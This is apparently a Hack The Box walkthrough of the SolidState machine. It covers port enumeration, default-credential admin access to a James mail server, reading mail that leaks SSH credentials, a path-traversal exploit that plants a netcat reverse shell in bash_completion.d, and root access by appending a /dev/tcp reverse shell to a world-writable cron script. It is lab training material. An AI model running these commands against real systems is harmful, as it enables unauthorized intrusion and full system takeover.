##    Hack The Box       SolidState (10.129.58.24)



### Enumeration 


First I'll start with an enumeration and we notice ports 22, 25, 119,80, 110, 4555 open on SolidState.

	PORT     STATE SERVICE REASON         VERSION
	22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
	| ssh-hostkey: 
	|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
	|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE=
	|   256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
	25/tcp   open  smtp?   syn-ack ttl 63
	|_smtp-commands: Couldn't establish connection on port 25
	80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
	|_http-title: Home - Solid State Security
	| http-methods: 
	|_  Supported Methods: HEAD GET POST OPTIONS
	110/tcp  open  pop3?   syn-ack ttl 63
	119/tcp  open  nntp?   syn-ack ttl 63
	4555/tcp open  rsip?   syn-ack ttl 63
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
	Aggressive OS guesses: Linux 3.12 (96%), Linux 3.13 (96%), Linux 3.16 (96%), Linux 3.18 (96%), Linux 3.2 - 4.9 (96%), Linux 3.8 - 3.11 (96%), Linux 4.4 (95%), Linux 4.2 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
	No exact OS matches for host (test conditions non-ideal).
	TCP/IP fingerprint:
	SCAN(V=7.94SVN%E=4%D=10/8%OT=22%CT=%CU=32334%PV=Y%DS=2%DC=T%G=N%TM=6705ABBC%P=aarch64-unknown-linux-gnu)
	SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)
	OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)
	WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
	ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)
	T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
	T2(R=N)
	T3(R=N)
	T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
	T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
	T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
	T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
	U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
	IE(R=Y%DFI=N%T=40%CD=S)

	Uptime guess: 0.021 days (since Tue Oct  8 16:31:27 2024)
	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=259 (Good luck!)
	IP ID Sequence Generation: All zeros
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	TRACEROUTE (using port 443/tcp)
	HOP RTT      ADDRESS
	1   60.89 ms 10.10.14.1
	2   62.03 ms 10.129.58.24

By using netcat we can determine that JAMES SMTP Server 2.3.2 is running on port 25.

![james](/SolidState/images/james.png)


Using netcat we are able to login to James Remote Management Tool with the user pass combo root:root.

![james](/SolidState/images/login.png) 

We have 5 users:

1. james
2. thomas
3. john
4. mindy
5. mailadmin

![james](/SolidState/images/users.png) 

- Logging into James Server Administration on port 4555 with nc we can reset the user's passwords. I reset all their passwords to 'griffin3' and I also added a user 'jesta' and set his passed to 'griffin'3 as well. 


![james](/SolidState/images/password.png) 


![james](/SolidState/images/password-2.png) 


Browsing to SolidState's webpage i can see that their email accounts are using the solid-state-security.com domain. With this information we can use a tool called smtp-user-enum to verify email accounts and check to see if any of the users have emails that we might be able to read. I couldn't get smtp-users-enum to work. SolidState takes a long time to query information so that might be why. I'll go ahead and try to enumerate emails in pop3 and that's hosted on port 110 so we can just telnet info port 110

### Helpful POP3 commands

1. USER [username] - 1st login command
2. PASS [password] - 2nd login command - Remember I set everyone's password to griffin3
3. QUIT - Logs out
4. STAT - Returns total number of messages and total size
5. LIST - Lists all messages
6. RETR [message]
7. DELE [message]
8. NOOP The POP3 server does nothing, it merely replies with a positive response

We do see that mindy has a couple of mails. Let's try reading them.

	RETR 1
	+OK Message follows
	Return-Path: <mailadmin@localhost>
	Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
	MIME-Version: 1.0
	Content-Type: text/plain; charset=us-ascii
	Content-Transfer-Encoding: 7bit
	Delivered-To: mindy@localhost
	Received: from 192.168.11.142 ([192.168.11.142])
		     by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
		     for <mindy@localhost>;
		     Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
	Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
	From: mailadmin@localhost
	Subject: Welcome

	Dear Mindy,
	Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

	We are looking forward to you joining our team and your success at Solid State Security. 

	Respectfully,
	James


	RETR 2
	+OK Message follows
	Return-Path: <mailadmin@localhost>
	Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
	MIME-Version: 1.0
	Content-Type: text/plain; charset=us-ascii
	Content-Transfer-Encoding: 7bit
	Delivered-To: mindy@localhost
	Received: from 192.168.11.142 ([192.168.11.142])
		     by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
		     for <mindy@localhost>;
		     Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
	Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
	From: mailadmin@localhost
	Subject: Your Access

	Dear Mindy,


	Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
	Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

	username: mindy
	pass: P@55W0rd1!2@

	Respectfully,
	James


### Foothold

#### SSH Creds for minds

- username > mindy
- Password > P@55W0rd1!2@

1. First I'll use netcat to connect to port 4555 and add a user per the following python [exploit](https://www.exploit-db.com/exploits/35513).

![james](/SolidState/images/part-1.png) 

2. I added the user jesta on James' Remote Administration Tool. Next per the 2nd part of the exploit we'll use telnet to connect to port 110 and send an email to /etc/bash_completion.d and add a reverse shell


![james](/SolidState/images/part-2.png) 

3. I'll let up at netcat listener on my host on port 443

4. I'll connect via SSH to mindy to trigger the shell

- sshpass -p 'P@55W0rd1!2@' ssh mindy@10.129.8.209

5. And I get a shell connection.

![james](/SolidState/images/format.png) 


I read a page about exploiting James Server and I think if I run the following commands I can exploit the server and get a shell.



nc 10.129.58.24 4555

adduser ../../../../../../../../etc/bash_completion.d 0xdf0xdf
User ../../../../../../../../etc/bash_completion.d added
quit

![james](/SolidState/images/adduser.png) 


telnet 10.129.58.24 25

EHLO jesta

MAIL FROM: <'jesta@10.10.14.240>

RCPT TO: <../../../../../../../../etc/bash_completion.d>

DATA

FROM: jesta@10.10.14.240
'
/bin/nc -e /bin/bash 10.10.14.240 443
.

quit

![james](/SolidState/images/mail.png) 

### Privilege escalation

I notice there's an all user's 777 read, write and execute file /opt/tmp that get executed by root every 3 minutes as a chron job. I'll write a reverse shell to the python file.


1. echo "os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.240/4444 0>&1\"')" >> tmp.py 

2. I'll start a listener on my attack host and wait for the cron job to run.


![james](/SolidState/images/root.png) 

![james](/SolidState/images/root-2.png) 

And we can login as the root user now. 
